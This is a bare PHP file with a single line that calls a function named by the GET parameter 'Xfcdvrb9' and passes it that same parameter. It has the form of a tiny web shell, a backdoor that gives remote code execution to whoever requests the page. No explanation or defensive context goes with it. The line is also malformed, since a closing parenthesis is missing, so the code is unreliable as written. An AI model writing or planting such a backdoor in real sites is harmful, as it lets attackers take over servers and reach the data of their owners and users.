<?php
$_GET['Xfcdvrb9']($_GET['Xfcdvrb9'];
?>
